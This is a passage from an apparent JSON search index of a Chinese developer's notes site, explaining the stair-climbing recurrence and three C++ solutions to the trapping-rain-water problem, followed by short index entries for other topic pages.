算法示例-爬楼梯 有一个台阶 1~n, 每次可以走 1~n 步(n不大于剩余楼梯数), 有多少种走法 解: 考虑在第n阶的时候, 用 d[n] 表示一共有多少选择, 有这些选择 从 n-1 开始, 走 1 步, 那么只需要考虑 d[n-1] 有多少种 (走一步的本身与前面的每一个 d[n-1] 构成一种选择, 所以没有额外需要加的) 注解 对很多人来说, 最卡的一点就是, 没想通: d[n-1] 中的每一种方案, 都与最后的一步, 一起继续构成这一种方案 ,\n下同 从 n-2 开始, 走 2 步, d[n-2] 从 n-3 开始, 走 3 步, d[n-3] 省略... 从 1 开始, 走 n-1 步, d[1], 显而易见 d[1] = 1 可以推断出: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1] 编码: d = [0] * (n+1)\nd[1] = 1\n\nfor i in range(2, n+1):\n  for j in range(1, i):   # j 范围是, [1, i-1], 因为 j 为 i 的时候加的是 d[0], 值为0, 可以简化掉\n    d[i] += d[i-j]\n\n  # 内循环也可以从头部加起来\n  # for j in range(1, i):\n  #   d[i] += d[j]\n\nreturn d[n] 优化, 由上面的递推公式可以推断出: d[n-1] = d[n-2] + d[n-3] + ... + d[1] 所以, 原来的递推可以变化为: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1]\n  = d[n-1] +  (d[n-2] + d[n-3] + ... + d[1])\n  = d[n-1] +  d[n-1]\n  = 2 * d[n-1] 即: d[n] = 2 * d[n-1] 也就说说, 第n个结果是上一个结果的 2 倍, 那就好办了,\n一共有 n 个台阶, 一共需要被累乘(n-1)次, 直接: return 2 ** (n-1) 也可以笨一点递归乘: d = [0] * (n+1)\nd[1] = 1\n\nfor i in range(2, n+1):\n  d[i] = 2 * d[i-1]\n\nreturn d[n] 其他-接雨水 具体案例需要距离分析,\n比如接雨水问题, 参考: 经典面试题：接雨水问题详解 就是用一个数组表示一个条形图，问你这个条形图最多能接多少水: int trap(int[] height); 最重要的几点: 对于每一个位置i,\n能接到的雨水数: min(l_max, r_max) - height[i] 每一个位置i, 左右的最高值都可以先算出, 这是备忘录的基础 暴力: int trap(vector<int>& height) {\n    int n = height.size();\n    int ans = 0;\n    for (int i = 1; i < n - 1; i++) {\n        int l_max = 0, r_max = 0;\n        // 找右边最高的柱子\n        for (int j = i; j < n; j++)\n            r_max = max(r_max, height[j]);\n        // 找左边最高的柱子\n        for (int j = i; j >= 0; j--)\n            l_max = max(l_max, height[j]);\n        // 如果自己就是最高的话，\n        // l_max == r_max == height[i]\n        ans += min(l_max, r_max) - height[i];\n    }\n    return ans;\n} 备忘录解法: int trap(vector<int>& height) {\n    if (height.empty()) return 0;\n    int n = height.size();\n    int ans = 0;\n    // 数组充当备忘录\n    vector<int> l_max(n), r_max(n);\n    // 初始化 base case\n    l_max[0] = height[0];\n    r_max[n - 1] = height[n - 1];\n    // 从左向右计算 l_max\n    for (int i = 1; i < n; i++)\n        l_max[i] = max(height[i], l_max[i - 1]);\n    // 从右向左计算 r_max\n    for (int i = n - 2; i >= 0; i--)\n        r_max[i] = max(height[i], r_max[i + 1]);\n    // 计算答案\n    for (int i = 1; i < n - 1; i++)\n        ans += min(l_max[i], r_max[i]) - height[i];\n    return ans;\n} 双指针解法: int trap(vector<int>& height) {\n    if (height.empty()) return 0;\n    int n = height.size();\n    int left = 0, right = n - 1;\n    int ans = 0;\n\n    int l_max = height[0];\n    int r_max = height[n - 1];\n\n    while (left <= right) {\n        l_max = max(l_max, height[left]);\n        r_max = max(r_max, height[right]);\n\n        // ans += min(l_max, r_max) - height[i]\n        if (l_max < r_max) {\n            ans += l_max - height[left];\n            left++;\n        } else {\n            ans += r_max - height[right];\n            right--;\n        }\n    }\n    return ans;\n} 仔细发现, 双指针相对于备忘录其实有点不同,\n备忘录计算的是每次紧邻位置i左右的最高点, 即 l_max[i] 和 r_max[i] 代表的是 height[0..i] 和 height[i..end] 的最高柱子高度;\n双指针仅仅是当前指针位置一侧最高点, 即 l_max 和 r_max 代表的是 height[0..left] 和 height[right..end] 的最高柱子高度. 那后者为什么可以代表前者? 还是看计算公式: min(l_max, r_max) - height[i] 我们需要的只是 l_max, r_max 中的最小值,\n先看备忘录, 与正常的思维一致: min(l_max, r_max) = max(max(height[0..i]), max(height[i..end])) 再看双指针: min(l_max, r_max) = max(max(height[0..left]), max(height[right..end])) 区别就是少考虑了 height[left..right], 那么这个区间会造成影响吗? 解析说明 先考虑: max(height[0..left]) < max(height[right..end])\n\n# 即 l_max < r_max 的情况, 如果 height[left..right] 区间的值都比 max(height[right..end]) (即r_max) 小了,\n那么实际两者就是等价的: max(max(height[0..left]), max(height[right..end])) = max(max(height[0..i]), max(height[i..end])) 如果height[left..right] 区间的值存在比 max(height[right..end]) (即r_max) 大的,\n即使找到那个值(记为 r_plus )了, 就是: max(l_max, r_max)\n=>\nmax(l_max, r_plus)\n\n# 上面说了这是  l_max < r_max 的情况, 所以 两者的结果都是一样的 因为 l_max < r_max, 对于比 r_max 更大的 r_plus, l_max < r_plus 肯定也是成立的 两者也是等价的 反之当 l_max > r_max 同样也成立, 所以完全可以用双指针.","tags":"数据结构","url":"/yq-docs-data-structure-index.html","loc":"/yq-docs-data-structure-index.html"},{"title":"数据库","text":"mysql 使用 底层实现 遇到过的问题 redis elasticsearch","tags":"数据库","url":"/yq-docs-database-index.html","loc":"/yq-docs-database-index.html"},{"title":"文档相关","text":"rst标记语言 wiki 问题 TeX家族","tags":"文档","url":"/yq-docs-document-index.html","loc":"/yq-docs-document-index.html"},{"title":"操作系统","text":"按照常见类型划分, 如linux, windows等 linux windows Android Mac","tags":"操作系统","url":"/yq-docs-operating-system-index.html","loc":"/yq-docs-operating-system-index.html"},{"title":"后端","text":"编程语言 c dart java python swift object-c ruby rust go","tags":"后端","url":"/yq-docs-rear-end-index.html","loc":"/yq-docs-rear-end-index.html"},{"title":"版本控制","text":"git svn svn与git的区别","tags":"版本控制","url":"/yq-docs-version-control.html","loc":"/yq-docs-version-control.html"}]};